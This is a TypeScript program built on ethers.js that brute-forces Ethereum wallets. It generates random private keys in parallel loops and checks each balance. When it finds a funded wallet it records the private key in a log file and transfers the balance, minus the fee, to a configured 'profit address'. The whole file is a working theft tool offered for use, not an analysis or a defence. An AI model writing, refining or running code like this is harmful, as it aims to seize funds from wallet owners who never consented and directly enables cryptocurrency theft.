import 'colors.ts';
import { BigNumber, ethers, utils, Wallet } from 'ethers';

import fs from 'fs';
import { env, exit } from 'process';

const DEFAULT_CHAIN_ID = 1;

const parallelLevel = +(env.PARALLEL_LEVEL ?? 1);
const profitAddress = env.PROFIT_ADDRESS;
const updatePriceInterval = +(env.UPDATE_GAS_PRICE_INTERVAL ?? 10_000);
const nodeUrl = env.NODE_URL;
const chainId = +(env.CHAIN_ID ?? DEFAULT_CHAIN_ID);

const notUndefinedOrExit = (value: any, objName?: string): void => {
  if (value) return;
  if (objName) console.error(`${objName} must be set!`.red);
  exit(1);
};

notUndefinedOrExit(profitAddress, 'Profit address');
notUndefinedOrExit(nodeUrl, 'Node URL');

const provider = new ethers.providers.JsonRpcProvider(env.NODE_URL, chainId);

const gasForTransfer = BigNumber.from('21000');

const priorityFeePerGas = utils.parseUnits(
  env.PRIORITY_FEE_PER_GAS_GWEI ?? '1',
  'gwei',
);

let gasPrice = BigNumber.from(0);

const calcTransferFee = (
  gPrice: BigNumber,
): { baseFee: BigNumber; feeIncludingPriority: BigNumber } => {
  return {
    baseFee: gasForTransfer.mul(gPrice),
    feeIncludingPriority: gasForTransfer.mul(gPrice.add(priorityFeePerGas)),
  };
};

const updateGasPrice = async (): Promise<void> => {
  gasPrice = await provider.getGasPrice();
  console.log(
    'Gas price updated. New price: '.cyan +
      ethers.utils.formatUnits(gasPrice, 'gwei').yellow +
      ' gwei'.cyan,
  );
};

const logToFile = (data: string): void => {
  const filePath = './logs/';

  if (!fs.existsSync(filePath)) fs.mkdirSync(filePath);

  const stream = fs.createWriteStream(filePath + 'app.log', { flags: 'a+' });
  stream.write(data);
  stream.end();
};

const parallelTask = async (taskNumber: number): Promise<void> => {
  try {
    do {
      // todo revise? how to pass provider into random-created wallet
      await handleWallet(
        new Wallet(Wallet.createRandom().privateKey, provider),
      );
    } while (true);
  } catch (err) {
    console.log(
      'Parallel task №'.red + taskNumber.toString().cyan + ' error.'.red,
      err,
    );
  }
};

const handleWallet = async (wallet: Wallet): Promise<void> => {
  const balance = await wallet.getBalance();
  const lastGasPrice = gasPrice;
  const { feeIncludingPriority } = calcTransferFee(lastGasPrice);

  if (balance.isZero()) return;

  console.log('NON ZERO BALANCE WALLET FOUND!'.green);

  logToFile(
    new Date().toUTCString() +
      ' | ' +
      wallet.privateKey +
      ' | ' +
      utils.formatEther(balance) +
      '\n',
  );

  if (!balance.gte(feeIncludingPriority)) return;

  console.log('TRANSFERRING FUNDS!'.green);

  console.log(lastGasPrice.toString());

  wallet
    .sendTransaction({
      to: profitAddress,
      value: balance.sub(feeIncludingPriority),
      gasPrice: lastGasPrice,
      maxPriorityFeePerGas: priorityFeePerGas,
    })
    .then(() => console.log('SUCCESSFULLY TRANSFERRED'.green))
    .catch((err: any) => console.error('TRANSFER ERROR'.red, err));
};

const main = async (): Promise<void> => {
  await updateGasPrice();

  setInterval(updateGasPrice, updatePriceInterval);

  console.log('Wallets brute force started'.green);

  await Promise.all(
    Array.from(Array<number>(parallelLevel).keys()).map(parallelTask),
  );
};

main().catch((err) => console.error('Execution error: '.red, err));
